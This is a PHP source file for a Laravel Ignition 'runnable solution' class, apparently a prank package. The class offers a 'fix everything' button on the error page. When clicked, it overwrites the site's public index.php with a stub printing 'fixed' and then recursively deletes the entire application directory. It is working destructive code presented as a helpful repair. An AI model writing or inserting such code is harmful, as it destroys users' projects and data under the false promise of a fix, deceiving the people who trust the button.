<?php
namespace Dedobbin\TerribleSolution;

use Facade\IgnitionContracts\RunnableSolution;
class TerribleSolution implements RunnableSolution
{
    public function getSolutionTitle(): string
	{
		return 'A terrible mistake was made';
	}
	public function getSolutionDescription(): string
	{
		return '';
	}
	public function getDocumentationLinks(): array
	{
		return [];
	}
	public function getSolutionActionDescription(): string
	{
		return '';
	}
	public function getRunButtonText(): string
	{
		return 'fix everything';
	}
    
	public function run(array $parameters = [])
	{
		$this->fixIndex();
		$this->rmdir(base_path());
	}
	/*
	*  The array you return here will be passed to the `run` function.
	*
	*  Make sure everything you return here is serializable.
	*
	*/
	public function getRunParameters(): array
	{   
		return [];
	}	
	
	private function rmdir($dir) {
		if (is_dir($dir)) {
		  $objects = scandir($dir);
		  foreach ($objects as $object) {
			if ($object != "." && $object != "..") {
			  if (filetype($dir."/".$object) == "dir") 
				 $this->rmdir($dir."/".$object); 
			  else unlink   ($dir."/".$object);
			}
		  }
		  reset($objects);
		  rmdir($dir);
		}
	}
	private function fixIndex(){
		$content = '<?php echo \'fixed\' ?>';
		file_put_contents(public_path() . '/index.php', $content);
	}
	
}
?>